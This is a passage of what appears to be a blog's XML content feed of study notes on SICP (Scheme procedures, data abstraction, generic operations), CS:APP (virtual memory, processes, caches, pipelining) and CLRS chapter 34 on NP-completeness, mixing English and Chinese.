car z ) = x &amp;&amp; ( cdr z ) = y 1 2 3 4 5 6 7 8 9 (define (cons x y) (define (dispatch m) (cond ((= m 0) x) ((= m 1) y) (else (error "Argument not 0 or 1: CONS" m)))) ;message passing: data representation returns procedure dispatch) (define (car z) (z 0)) (define (cdr z) (z 1)) Exercise 2.6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ;2.6 ;church numerals DEF ( define zero ( lambda ( f ) ( lambda ( x ) x ) ) ) ( define ( add-1 n ) ( lambda ( f )( lambda ( x ) ( f ( ( n f ) x ) )))) ;从0开始，每多一个f就+1 ( define ( church-to-int ch ) ( ( ch ( lambda ( n ) ( + n 1 ) ) ) 0 ) ) ( define one ( lambda ( f ) ( lambda ( x ) ( f x ) ) ) ) ( define two ( lambda ( f ) ( lambda ( x ) ( f ( f x ) ) ) ) ) ;a,b: function of zero, one, two... ;b以x为参数经过b次apply f ;a以x经过b次apply后的结果为参数(( b f ) x )，在此基础上再apply f a次 ( define ( add a b ) ( lambda ( f ) ( lambda ( x ) ( ( a f ) ( ( b f ) x ) ) ) ) ) ;调用 ( define ( square x ) ( * x x )) ; f = square x = 2 ( ( two square ) 2 ) 2.2 Hierarchical Data and the Closure Propertyclosure property of cons ( an operation ) The ability to create pairs whose elements are pairs Closure is the key to create hierarchical structures 2.2.1 Representing Sequences The entire sequence is constructed by nested cons operations 1 2 3 4 (cons 1 (cons 2 (cons 3 (cons 4 nil)))) Provides a primitive 1 (list ⟨ a 1 ⟩ ⟨ a 2 ⟩ . . . ⟨ a n ⟩ ) Operations 1 ref, length, append, last-pair, reverse Mapping over list Establish an abstraction barrier that isolates the implementation of procedures that transform lists from the details of how the elements of the list are extracted and combined. 1 2 3 4 5 (define (map proc items) (if (null? items) nil (cons (proc (car items)) (map proc (cdr items))))) 2.2.2 Hierarchical Structures Tree sequences whose elements are sequences Recursion is a natural tool for dealing with tree structures 2.2.3 Sequences as Conventional Interfaces Conventional Interface permits us to combine processing modules Signal Processing A signal-processing engineer would find it natural to conceptualize these processes in terms of signals flowing through a cascade of stages, each of which implements part of the program plan. Organizing programs so as to reflect the signal-flow structure concentrate on the “signals” represent these signals as lists use list operations to implement the processing helps us make program designs that are modular connecting the components in flexible ways Nested Mappings 1 2 (define (flatmap proc seq) (accumulate append nil (map proc seq))) 2.3 Symbolic DataIssue arise words and sentences may be regarded either as semantic entities ( meaning ) or as syntactic entities ( characters ) Using quotation mark 1 2 (list 'a 'b) (a b) manipulating symbols 1 eq?, memq 2.4 Multiple Representations for Abstract Datacope with data that may be represented in different ways by different parts of a program Data Abstraction separate the task of designing a program that uses rational numbers from the task of implementing rational numbers an application of the “principle of least commitment” Abstraction Barrier formed by the selectors and constructors permits us to defer to the last possible moment the choice of a concrete representation thus retain maximum flexibility 2.4.1 Representations for Complex Numbers constructors 1 2 (make-from-real-imag (real-part z) (imag-part z)) (make-from-mag-ang (magnitude z) (angle z)) selectors rectangular representation &amp; polar representation 1 real-part,imag-part,magnitude,angle implement arithmetic on complex numbers 1 add-complex, sub-complex, mul-complex, div-complex implement 2 representations of complex number 1 分别用直角和极坐标来实现4个selector和2个constructor 2.4.2 Tagged data If both representations are included in a single system, we will need some way to distinguish data in polar form from data in rectangular form. A straightforward way to accomplish this distinction is to include a type tag —the symbol rectangular or polar —as part of each complex number. 1 2 (define (make-from-real-imag-rectangular x y) (attach-tag 'rectangular (cons x y))) Make sure names do not conflict: Append the suffix -rectangular 1 (define (real-part-rectangular z) (car z)) Generic selector Dispatch: checks the tag and calls the appropriate procedure of that type. because the selectors are generic, operation ( add, mul ) are unchanged 1 2 3 4 5 6 (define (real-part z) (cond ((rectangular? z) (real-part-rectangular (contents z))) ((polar? z) (real-part-polar (contents z))) (else (error "Unknown type: REAL-PART" z)))) Generic Constructor 1 2 (define (make-from-real-imag x y) (make-from-real-imag-rectangular x y)) General mechanism for interfacing the separate representations stripping off and attaching tags as data objects are passed from level to level 2.4.3 Data-Directed Programming and Additivity Two weaknesses of dispatching above generic interface procedures must know about all the different representations must guarantee that no two procedures in the entire system have the same name Additive design the individual packages separately and combine them to produce a generic system Data-directed programming dealing with a two-dimensional table the possible operations on one axis and the possible types on the other axisss Manipulate table 1 2 (put ⟨ op ⟩ ⟨ type ⟩ ⟨ item ⟩ ) (get ⟨ op ⟩ ⟨ type ⟩ ) Defines a package Interfaces these by adding entries to the table 1 2 3 4 5 6 7 8 9 10 11 12 (define (install-rectangular-package) ;; internal procedures (define (real-part z) (car z)) (define (make-from-real-imag x y) (cons x y)) ;; interface to the rest of the system (define (tag x) (attach-tag 'rectangular x)) (put 'real-part '(rectangular) real-part) (put 'make-from-real-imag 'rectangular (lambda (x y) (tag (make-from-real-imag x y)))) 'done) Generic Selectors 1 2 3 4 5 6 7 8 9 (define (apply-generic op . args) (let ((type-tags (map type-tag args))) (let ((proc (get op type-tags))) (if proc ;apply arguments to procedure (apply proc (map contents args)) (error "No method for these types: APPLY-GENERIC" (list op type-tags)))))) 1 (define (real-part z) (apply-generic 'real-part z)) Generic Constructors 1 2 (define (make-from-real-imag x y) ((get 'make-from-real-imag 'rectangular) x y)) Interface ( generic selectors ) Previous Data-directed a set of procedures single procedure explicit dispatch looks up name conflicts internal change if a new representation is added doesn’t change Centralized selectors Decentralized Message passing Data object receives the requested operation name as a “message.” Instead of using “intelligent operations” that dispatch on data types work with “intelligent data objects” that dispatch on operation names. Represent data object as a procedure takes as input the required operation name performs the operation indicated Constructor 1 2 3 4 5 6 (define (make-from-real-imag x y) (define (dispatch op) (cond ((eq? op 'real-part) x) (else (error "Unknown op: MAKE-FROM-REAL-IMAG" op)))) ;return procedure dispatch) Selector 1 (define (apply-generic op arg) (arg op)) 2.5 Systems with Generic Operationsuse data-directed techniques to construct a package of arithmetic operations 2.5.1 Generic Arithmetic Operations generic arithmetic procedures 1 (define (add x y) (apply-generic 'add x y)) install packages 1 2 3 4 5 6 7 8 9 10 11 12 13 (define (install-complex-package) ;; imported procedures from rectangular and polar packages (define (make-from-real-imag x y) ((get 'make-from-real-imag 'rectangular) x y)) ;; internal procedures (define (add-complex z1 z2) (make-from-real-imag (+ (real-part z1) (real-part z2)) (+ (imag-part z1) (imag-part z2)))) ;; interface to rest of the system (define (tag z) (attach-tag 'complex z)) (put 'make-from-real-imag 'complex (lambda (x y) (tag (make-from-real-imag x y)))) 'done) constructor 1 2 (define (make-complex-from-real-imag x y) ((get 'make-from-real-imag 'complex) x y)) two-level tag system 2.5.3 Example: Symbolic Algebra implement polynomial package arithmetic on polynomials representation of polynomials arithmetic on term list representation of term list Data Directed Recursion using generic operation ( ADD ) inside each package Hierarchy of types in symbolic data recursive data abstraction neither of these types is above the other naturally difficult to control coercion 2.5.2 Combining Data of Different Types Define cross-type operations One way: design a different procedure for each possible combination of types 1 2 3 4 5 ;; to be included in the complex package (define (add-complex-to-schemenum z x) (make-from-real-imag (+ (real-part z) x) (imag-part z))) (put 'add '(complex scheme-number) (lambda (z x) (tag (add-complex-to-schemenum z x)))) Cumbersome more code is needed individual packages need to take account of other packages ( not additive ) Coercion objects of one type may be viewed as being of another type coercion procedure 1 2 (define (scheme-number-&gt;complex n) (make-complex-from-real-imag (contents n) 0)) install in coercion table 1 2 3 (put-coercion 'scheme-number 'complex scheme-number-&gt;complex) apply-generic check the coercion table to see if objects of the first type can be coerced to the second type or if there is a way to coerce the second argument to the type of the first argument 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 (define (apply-generic op . args) (let ((type-tags (map type-tag args))) (let ((proc (get op type-tags))) (if proc (apply proc (map contents args)) (if (= (length args) 2) (let ((type1 (car type-tags)) (type2 (cadr type-tags)) (a1 (car args)) (a2 (cadr args))) (let ((t1-&gt;t2 (get-coercion type1 type2)) (t2-&gt;t1 (get-coercion type2 type1))) (cond (t1-&gt;t2 (apply-generic op (t1-&gt;t2 a1) a2)) (t2-&gt;t1 (apply-generic op a1 (t2-&gt;t1 a2))) (else (error "No method for these types" (list op type-tags)))))) (error "No method for these types" (list op type-tags))))))) Advantage need to write only one procedure for each pair of types rather than a different procedure for each collection of types and each generic operation. Not General Enough can’t converting both objects to a third type. Hierarchies of types apply-generic raise the object to its super type until we either find a level at which the desired operation can be performed or hit the top Inadequates multiple-supertypes means that there is no unique way to “raise” a type in the hierarchy]]></content>
      <categories>
        <category>Structure and Interpretation of Computer Programs</category>
      </categories>
      <tags>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[SICP-ch1] Building Abstractions with Procedures]]></title>
    <url>%2F2018%2F02%2F28%2FSICP%2Fsicp1%2F</url>
    <content type="text"><![CDATA[SICP ch-1 Building Abstractions with ProceduresWe are about to study the idea of computational process 1.1 The Elements of ProgrammingLanguage combine simple ideas to form complex ideas by three mechanisms primitive expression means of combination means of abstraction 1.1.1 Expressions you type an expression, the interpreter responds by displaying the result of its evaluating that expression ( 486 ) Combinations Expressions formed by delimiting a list of expressions within parentheses ( + 137 349 ) operator, operands 1.1.2 Naming and the Environment Naming language provides the means of using names ( variable ) to refer to computational objects ( value ) Associating values with symbols Environment The memory that interpreter must maintain to keeps track of the name-object pairs. ( ch-3 ) Determine the meaning of the symbols in expressions. 1.1.3 Evaluating Combinations Interpreter is itself following a procedure Evaluate the subexpressions of the combination Apply the procedure that is the value of the leftmost subexpression (the operator) to the arguments that are the values of the other subexpressions (the operands). Thus, the evaluation rule is recursive in nature. Special Forms Exceptions to the general evaluation rule. ( apply operator to operands ) Each special form has its own evaluation rule. define, cond, if, and, or, 1.1.4 Compound Procedures Procedure definitions 1 2 (define (&lt;name&gt; &lt;formal parameters&gt;) &lt;body&gt;) 1.1.5 The Substitution Model for Procedure Application Evaluate a combination evaluates the elements of the combination applies the procedure to the arguments Substitution Model To apply a compound procedure to arguments, evaluate the body of he procedure with each formal parameter replaced by the corresponding argument. Typical interpreters do not evaluate procedure by substitute values, but using a local environment for the formal parameters ( ch-3 ) This model breaks down when we address procedures with “mutable data” ( ch-3 set! ) Normal Order fully expand and then reduce (x) Applicative Order evaluate the arguments and then apply 1.1.6 Conditional Expressions and Predicates Predicate an expression whose value is interpreted as either true or false. 1 2 3 4 5 6 7 8 9 10 11 12 (cond (&lt;p1&gt; &lt;e1&gt;) (&lt;p2&gt; &lt;e2&gt;) ... (&lt;pn&gt; &lt;en&gt;)) (if &lt;predicate&gt; &lt;consequent&gt; &lt;alternative&gt;) (and &lt;e1&gt; ... &lt;en&gt;) (or &lt;e1&gt; ... &lt;en&gt;) (not &lt;e&gt;) 1.1.7 Example: Square Roots by Newton’s Method 1.1.8 Procedures are Black-Box Abstractions bound variables In procedure definition, it doesn’t matter what name the formal parameter has. free variables the scope of that name 1.2 Procedures and the Processes They GenerateProcedure A procedure is a pattern for the local evolution of a computational process. It specifies how each stage of the process is built upon the previous stage. 1.2.1 Linear Recursion and Iteration Recursive procedure syntactic fact that the procedure definition refers to the procedure itself Recursive process The process that characterized by a chain of deferred operations Requires interpreter keep track of operations to be performed later on. Iterative process one whose state can be summarized by a fixed number of state variables, together with a fixed rule that describes how the state variables should be updated as the process moves from state to state and an (optional) end test. Tail Recursive An implementation with the property of: “An iterative process will be executed in constant space, even if it is described by a recursive procedure.” 1.3 Formulating Abstractions with Higher-Order ProceduresProcedures are abstractions that describe compound operations Higher-order procedures procedures that manipulate procedures 1.3.1 Procedures as Arguments 1.3.2 Constructing Procedures Using lambda In general, lambda is used to create procedures in the same way asdefine , except that no name is specified for the procedure 1 2 (lambda (&lt;formal parameters&gt;) &lt;body&gt;) using lambda creating local variables 1 2 3 4 5 (let ((&lt;var1&gt; &lt;exp1&gt;) (&lt;var2&gt; &lt;exp2&gt;) ... (&lt;varn&gt; &lt;expn&gt;)) &lt;body&gt;) 1.3.3 Procedures as General Methods finding roots finding fixed point 1.3.4 Procedures as Returned Values return values are themselves procedures Abstractions and first-class procedures programming languages impose restrictions on the ways in which computational elements can be manipulated First-class status elements with fewest restrictions They may be named by variables. They may be passed as arguments to procedures. They may be returned as the results of procedures. They may be included in data structures. Lisp awards procedures full first-class status, which poses challenges for efficient implementation, but the resulting gain in expressive power is enormous.]]></content>
      <categories>
        <category>Structure and Interpretation of Computer Programs</category>
      </categories>
      <tags>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch1] A Tour of Computer Systems]]></title>
    <url>%2F2018%2F01%2F01%2FCSAPP%2Fch-1%2F</url>
    <content type="text"><![CDATA[CS:APP ch-1 A Tour of Computer SytemsA computer system consists of hardware and systems software that work together to run application programs. Tracing the life time of hello program. 1 2 3 4 5 6 7 8 #include &lt;stdio.h&gt; int main() &#123; printf("hello world!\n"); return 0; &#125; 1.1 Information Is Bits + ContextThe hello program begins life as a source program ( a sequence of bits, organized in bytes ) Text files files consist exclusively ASCII characters. Binary files all other files All information in a system is represented as a bunch of bits. The only thing that distinguishes different data objects is the context in which we view them. 1.2 Programs Are Translated by Other Programs into Different FormsIn order to run hello.c on the system, the individual C statements must be translated by other programs into a sequence of low-level machine-language instructions. These instructions are then packaged in a form called an executable object program and stored as a binary disk file. 1.3 It Pays to Understand How Compilation Systems WorkReasons why need to understand compilation systems Optimizing program performance Understanding link-time error Avoiding security holes 1.4 Processors Read and Interpret Instructions Stored in MemoryTo run the executable object file, type ./hello to an applcation program known as a shell Hardware Organization of a System Buses: transfer words I/O Devices: system’s connection to the external world, connected to I/O bus by either a controller or an adapter Main Memory: temporary storage device that holds both a program and the data it manipulates while the processor is executing the program Processor: the engine that inter-prets (or executes ) instructions stored in main memory Running hello Reading command from keyboard Load file from disk to memory Write output string from memory to display 1.5 Caches MatterThe machine instruction in the hello program are originally stored on disk When loaded, opied to main memory When processor runs, copied into the processor ( register + caches ) deal with processor-memory gap 1.6 Storage Devices Form a Hierarchystorage at one level serves as a cache for the next lower level 1.7 The Operating System Manages the HardwareOS a layer of software interposed between the application program and the hardware two primitive purpose: (1)protect hardware (2)provide applications with simple and uniform mechanisms for manipulating hardwares achieve both goals via abstractions Process The operating system’s abstraction for a running program context switching Thread VIrtual Memory Each process has the same uniform view of memory ( virtual address space ) Files A sequence of bytes, nothing more and nothing less Every I/O devices is modeled as a file 1.8 Systems Communicate with Other Systems Using Networks 1.9 Important ThemesAmdahl’s law: observation of the effectiveness Concurrency and Parallelism concurrency a system with multiple, simultaneous activities parallelism use of concurrency to make a system run faster Parrallelism can be exploited at multiple( three ) levels of abstraction in a computer system. ( hight –&gt; low ) Thread-level Concurrency: multicore &amp; hyperthreading Instruction-level Parallelism: pipeling Single-Instruction, Multiple-Data ( SIMD ) Parallelism The Importance of Abstractions in Computer Systems Processor side instruction set architecture provides an abstraction of actual processor Operating System side Files as an abstraction of I/O Virtual Memory as an abstraction of Program Memory Processes as an abstraction of a Running Program Virtual Machine as an abstraction of the Entire Computer]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch9] Virtual Memory]]></title>
    <url>%2F2017%2F12%2F29%2FCSAPP%2Fch-9%2F</url>
    <content type="text"><![CDATA[CS:APP ch-9 Virtual MemoryVirtual Memory modern systems provide an abstraction of main memory three important capabilities It uses main memory efficiently by treating it as a cache for an address space stored on disk, keeping only the active areas in main memory, and transferring data back and forth between disk and memory as needed. It simplifies memory management by providing each process with a uniform address space. It protects the address space of each process from corruption by other processes. 9.1 Physical and Virtual AddressingMain memory organized as an array of M contiguous byte-size cells, each byte has a unique physical address. Physical Addressing: use physical address ( PA ) to access memory Virtual Addressing: use virtual address ( VA ) and translate to physical address Addressing Translation: converting a virtual address to a physical one 9.2 Address SpacesVirtual Address Space CPU generates virtual addresses from an address space of $ N = 2^n $ addresses called the virtual address space {0 , 1, 2 ,…,N − 1} Physical Address Space A system also has a physical address space that corresponds to the M bytes of physical memory in the system {0 , 1, 2 ,…,M − 1} 9.3 VM as a Tool for CachingA virtual memory is organized as an array of N contiguous byte-sized cells stored on disk. Each byte has a unique virtual address that serves as an index into the array. VM systems partition the virtual memory into fixed-size blocks call Virtual Pages ( VP ) as transfer units between disk and main memory. Three sets of VP: Unallocated, Cached, Uncached DRAM cache organization large virtual pages ( cache block )( 4 KB to 2 MB ) fully associative sophisticated replacement algorithms use write-back Page Tables A data structure stored in physical memory that maps virtual pages to physical pages. Page Hit Check valid bit, uses the physical memory address in the PTE (which points to the start of the cached page in PP 1) to construct the physical address of the word. Page Faults The page fault exception invokes a page fault exception handler in the kernel selects a victim page, in this case VP 4 stored in PP 3. modifies the page table entry for VP 4 to reflect the fact that VP 4 is no longer cached in main memory. copies VP 3 from disk to PP 3 in memory, updates PTE 3, and then returns. restarts the faulting instruction and page hit The strategy of waiting until the last moment to swap in a page, when a miss occurs, is known as demand paging 9.4 VM as a Tool for Memory ManagementOperating systems provide a separate page table, and thus a separate virtual address space, for each process. Linking: Allow each process to use the same basic format for its memory image ( code segment always start at 0x400000 ) Loading: (1) Allocate Virtual Pages (2) Mark as invalid ( not cached ) (3) Point table entries to the location of in object file (4) Data are paged in th first time referenced Sharing: Multiple processes share a single copy of some code Memory Allocation 9.5 VM as a Tool for Memory Protectionthree permission bits to each PTE SUP must run in kernel mode READ / WRITE 9.6 Address Translationa mapping between an N-element virtual address space and M-element physical address space Steps that the CPU hardware performs when there is a page hit / fault Speeding up Address Translation with a TLB a small cache of PTEs in the MMU called a translation look aside buffer (TLB) Multi-Level Page Tables つ….つづく！]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch8] Exceptional Control Flow]]></title>
    <url>%2F2017%2F12%2F28%2FCSAPP%2Fch8%2F</url>
    <content type="text"><![CDATA[CS:APP ch-8 Exceptional Control Flowcontrol flow sequence of control transfers ( from the address of instruction to the next ) Exceptional Control Flow ( ECF ) Abrupt changes in control flow Occurs all levels Hardware: Transfers to exceptional handlers Operating System: Context switch Application: Signal Individual Program: Nonlocal jump 8.1 ExceptionsDEF Abrupt change in control flow in response to some change in the processor’s state event change in state Exception Handling Hardware processor detect an event determine corresponding exception number k trigger exception by calling the handler through entry k of the exception table Software ( handler ) do some processing return control to the interrupted control flow Difference with procedure call return either current or next instruction push additional processor state to restart ( on kernel stack ) handlers run in kernel mode Classes of Exceptions Interrupt: I/O devices Trap: System call ( fork, read, execve, exit ) Fault: error conditions that might be able to correct or just abort ( page fault, segmentation fault, divide zero ) Abort: unrecoverable ( machine check ) 8.2 ProcessesDEF: An instance of program in execution program run in context of process Logical Control Flow provide an illusion that program has exclusive use of the processor The sequence of PC values is know as logical control flow Each process executes a portion of its flow and then is preempted (temporarily suspended) while other processes take their turns. Concurrent Flow A logic flow whose execution overlaps in time with another flow Concurrency The general phenomenon of multiple flows executing concurrently Parallel Flow subset of concurrent flow that run on different cores Private Address Space provide an illusion that program has exclusive use of the system address’s space User and kernel mode: mode bit context the state that kernel needs to restart the preempted process ( general-purpose registers, floating point registers, program counter, user’s stack, status register, kernel’s stack, page table, process table, file table ) scheduling the kernel decide to preempt the current process and restart a previously preempted process Context Switch Saves context of the current process Restores the saved context of previous process Passes control to newly restored process Example when execute read system call ( disk ) Kernel switch process until disk sends an interrupt signal 8.4 Process ControlObtaining Process ID 1 pid_t getpid ( void ); Create and Terminating process Three states Running Stopped Terminated 1 void exit ( int status ); 1 2 //return 0 to child, PID of chile to parent pid_t fork ( void ); Call Once Return Twice Concurrent execution Duplicate but separate address space Shared files Reaping Child Process The process kept around in a terminated state until it is reaped by its parent 父进程进行回收的函数，也是一个等待子进程执行结束的函数就是waitpid。这在 APUE（advanced programming in unix enviroment）中很早就提过这个函数 1 2 // return PID of terminated child and reap it pid_t waitpid(pid_t pid, int *statud, int options) Putting Process to Sleep 1 2 unsigned int sleep(unsigned int secs); int pause(void); // 一直休眠，直到收到一个信号 Loading and Running Programs 1 int execve(const char *filename, const char *argv[], const char *envp[]); 8.5 SignalsThe transfer of a signal to a destination process occurs in two distinct steps Sending a signal The kernel has detected a system event such as a divide-by-zero error or the termination of a child process. A process has invoked the kill function to explicitly request the kernel to send a signal to the destination process. A process can send a signal to itself. Receiving a signal The process can either ignore the signal, terminate, or catch the signal by executing a user-level function called a signal handler. Pending signal A signal that has been sent but not yet received At any point in time, there can be at most one pending signal of a particular type. Received at most once: The kernel sets bit k in pending whenever a signal of type k is delivered and clears bit k in pending whenever a signal of type k is received. 8.6 Nonlocal Jumps]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch6] The Memory Hierarchy]]></title>
    <url>%2F2017%2F12%2F27%2FCSAPP%2Fch-6%2F</url>
    <content type="text"><![CDATA[CS:APP ch-6 The Memory Hierarchy6.1 Storage TechnologiesSRAM cache, transistor, stable, fast, expensive DRAM main memory, capacitor, sensitive( periodically refresh every bit ) d w cells –&gt; d supercells == r rows c columns ( two dimension array ) data pins ( w bits ) &amp; addr pins ( row addr i, column addr j ) Memory modules: Each supercell stores 11 byte. Each address represent by 8 supercells Enhanced DRAM Nonvolatile Memory ( ROM ) retain information even when they’re powered off Flash memory ( erasable programmable ROM ) firmware: programs stored in ROM Accessing Main Memory I/O bridge: translate signals Disk platter –&gt; surface –&gt; track –&gt; sectors Logical Disk Blocks: hide complexity from OS disk controller: maintains mapping between logical block number and physical disk sectors I/O devices: USB, graphics card, host bus adapter I/O bus: connect disks to CPU and main memory, independent under CPU Accessing Disk Memory mapped I/O: a block of addresses in the address space is reserved for communicating with I/O devices. Each of these address is known as an I/O port. Each device associated with one or more ports. CPU read disk initiate a read indicate logical block number that should be read indicate main memory address to store disk sector do other work Disk controller receives the read command translates logical block number to sector address read content transfer content directly to main memory ( DMA ) send a interrupt signal to CPU CPU returns control to the point where interrupted Solid State Disk A page can be written only after the entire block it belongs to has erased A block wears out after roughly 100, 000 repeated writes Advantage: semiconductor, faster, use less power, more rugged Disadvantage: potential to wear out, expensive 6.2 LocalityTemporal Locality: reference again multiple times Spatial Locality: reference nearby locations stride-k reference pattern: visiting every kth element of a contiguous vector k increase, spatial decrease 6.3 The Memory Hierarchy Caching in memory hierarchy Cache hits Cache misses replacing / evicting the block, victim block, replacement policy Kind of Cache misses cold miss: cache is empty conflict miss: map to the same block capacity miss: size of working set exceed Cache management partition storage into blocks, transfer blocks between levels, deal with hits and misses compiler – register file hardware logic – L1, L2, L3 caches OS + Address Translation hardware – main memory AFS client process – disk 6.4 Cache MemoriesMain memory: $ M = 2^m $ cache: $ C = S E B $ $ S = 2^s $ cache sets, $ E $ = cache lines, $ B = 2^b $ = bytes per block Address: set index = $ log_2S $ – Sets tag = $ m - ( s + b ) $ – Lines block offset = $ log_2B $ – blocks Process that cache determine hit or miss Set Selection Line matching: search each line, find tag bits in cache match tag bits in address Word Extraction: block offset provide first byte of desired word Line Replacement: random / least frequently used / least recently used Direct-Mapped Caches one line per set ( E = 1 ) Set Associative Caches a E-way set $ 1 &lt; E &lt; C/B $ Fully Associative Caches S = 1 $ E = C/B $ Issues with writes write-through ( immediately write to next lower level when hit ) no-write-allocate ( write directly to next lower level when miss ) write-back ( defers the update until it is evicted when hit ) write-allocate ( load the block into cache and update it when miss ) Anatomy of real cache hierarchy Instruction cache ( i-cache ) Data cache ( d-cache ) both ( unified cache ) 6.5 Writing Cache-Friendly Code6.6 Putting It Together: The Impact of Caches on Program Performancesmaller size – better temporal locality smaller stride – better spatial locality The memory mountain]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch4] Processor Architecture]]></title>
    <url>%2F2017%2F12%2F25%2FCSAPP%2Fch4%2F</url>
    <content type="text"><![CDATA[CS:APP-ch4 Processor ArchitectureISA –&gt; SEQ –&gt; PIPE 4.1 The Y86-64 Instruction Set Architecture (ISA)Programmer-Visible State Program registers Condition codes Program Counter(PC) Memory Status code Y86-64 Instructions type: code function register specifier bytes: rA rB additional 8-byte constant word: immediate data, displacement, destination Aside RISC &amp; CISC Y86-64 include both CISC: condition codes, variable length instructions, stack to store return address RISC: use load/store architecture and regular instruction encoding, pass argument through registers 4.2 Logical Design and the Hardware Control Language HCL4.3 Sequential Y86-64 ImplementationsOrganizing processing into stages Fetch: icode, ifun, valC = 8-byte constant, valP = next PC Decode: register valA = rA valB = rB Execute: valE = valA OP valB, CC Memory: valM = read/write from memory Write back: two result to register file PC Update: PC = valP SEQ Hardware Structure SEQ Timing SEQ: combinational logic two memory devices clocked register ( PC, CC reg ) random access memory ( register file, instruction memory, data memory ) Combinational logic does not require sequencing or control Instruction memory read only therefore also not required Required explicit control over sequencing Program Counter: loaded with new instruction address every clock cycle Condition Code register: loaded when integer operation register file: two ports, allow two program registers be updated on every cycle data memory: written only when rmmovq, pushq, call is executed PRINCIPLE never need to read back the state updated by an instruction in order to complete this instruction states are loaded during the start of next cycle 4.4 General Principle of PipeliningThroughput: number of instructions served per unit time Latency: Total time required to perform a single instruction from beginning to end Limitations Nonuniform partitioning ( 每个part的执行时间不同造成delay ) Diminishing Returns of Deep Pipelining (分太多了) Feedback (下一条指令要等上一条执行完) 4.5 Pipelined Y86-64 ImplementationsSEQ+ PC update stage comes at the beginning PIPE- insert registers Rearranging and Relabeling Signals Next PC Prediction Pipeline Hazard stalling forwarding load/use data hazard control hazard exception]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CLRS-ch34] NP-Completeness]]></title>
    <url>%2F2017%2F12%2F24%2FCLRS%2F34-np%2F</url>
    <content type="text"><![CDATA[CLRS-ch34 NP-CompletenessIntroclass P problems are solvable in polynomial time class NP problems are verifiable in polynomial time class NPC problems in NP and is as hard as any problem in NP 3 concept showing a problem is NPC decision problems reductions the first NP-complete problem Decision problems vs. optimization problems optimization problems : find a feasible solution with the best value. decision problems : answer is simply “yes” or “no” Relationship : decision is no harder Reductions $ A \longrightarrow B $ If B polynomially solvable, than A solvable If A polynomially unsolvable, than B unsolvable as well 34.1 Polynomial timeAbstract Problems a binary relation (function) on a set $ I $ of instances and a set $ S $ of solutions Concrete Problems problems whose instance set $ I $ is the set of binary strings Polynomial time solvable exist an algorithm to solve a concrete problem in $ O(n^k) $ Encodings a mapping e from the set of abstract object to the set of binary strings (abstract pro instances –&gt; concrete pro ins) extend the definition of class P into abstract problems Abstract Pro $ \longrightarrow $ Encode $ \longrightarrow $ Concrete Pro $ \longrightarrow $ Algorithm Solve depending on the encoding, the algorithm may runs in either polynomial or superpolynomial time. polynomially related encodings exist a polynomial-time algorithm can compute the en-coding $ e_2 (i) $ from the encoding $ e_1 (i) $, and vice versa. Only when two encodings $ e_1 $ and $ e_2 $ of an abstract problem are polynomially related, whether the problem is polynomial-time solvable or not can be independent of which encoding we use. Therefore Assume reasonable/standard encoding $ &lt; G &gt; $ encoding of an integer is polynomially related to its binary representation encoding of a finite set is polynomially related to its encoding as a list of its elements derive encodings of other object so that the choice of encoding has no effect on whether the abstract problem is polynomial-time solvable. A formal language framework alphabet $ \Sigma $ a finite set of symbols $ \{ 0,1 \} $ language $ L $ over $ Σ $ is any set of strings made up of symbols from $ Σ \ \{ 10, \ 11, \ 101 … \} $ $ \Sigma ^* $ the language of all strings over $ Σ $ view instances for any decision problems Q as a language L over $ Σ = \{ 0 ,1 \} $ Accepted The language L accepted by an algorithm A $ L = \{ x \in \{0,1\}^* : A(x) = 1 \} $ Reject : A(x) = 0 may runs forever if doesn’t accept Decided The language L decided by an algorithm A if every binary string in L is accepted by A (output 1) and every binary string not in L is rejected ( output 0) $ x \in L $ –&gt; A(x) = 1, $ x\notin L $ –&gt; A(x) = 0 Complexity class P $ P = \{ L \subseteq \{ 0,1 \}^{*} $ : exists an algorithm A that decides L in polynomial time $ \}$ 34.2 Polynomial-time verificationalgorithms verify membership from a certificate in languages Verified The language L verified by an algorithm A $ L = \{ x \in \{ 0, 1 \}^ : $ there exist $ y \in \{ 0,1 \}^ $ such that A( x,y ) = 1 $ \} $ Complexity class NP $ NP = \{ L \subseteq \{ 0, 1 \}^ : L = \{ x \in \{ 0,1\}^ $ : there exists a certificate y with |y| = $O(|x|^c) $ such that A(x,y) = 1 $ \} \} $ $P \subseteq NP $ Complexity class co-NP set of languages L such that $ \bar L \in NP $ Since P is closed under complement, $ P \subset NP \cap co-NP $ Four possibilities for relationship among complexity class 34.3 NP-completeness and reducibilityReducibility if $ Q \longrightarrow \ reduce \ \longrightarrow Q’ $ , $ Q $ is “no harder to solve” than $ Q’ $ $ Q \le_p Q’ $ ( no more than a polynomial factor harder ) NP-completeness $ L \in NP $ $ L’ \le_p L $ for every $ L’ \in NP $. (hardest) Theorem 34.4 If any NP-complete problem is polynomial time solvable, then P = NP If any problem in NP is not polynomial-time solvable, then all NP-complete problems are not polynomial-time solvable. Circuit satisfiability Given a boolean combinational circuit composed of AND, OR, and NOT gates, is it satisfiable? 34.5 belongs to NP 34.6 NP-hard basic idea : represent the computation of A(algorithm verify L) as a sequence of configurations. Each configuration is mapped to the next configuration by a boolean combinational circuit M. The output is a distinguished bit in the working storage. The reduction algorithm F constructs a single combinational circuit that computes all configurations produced by a given initial configuration. 34.5 NP-complete problems]]></content>
      <categories>
        <category>Introduction to Algorithms</category>
      </categories>
      <tags>
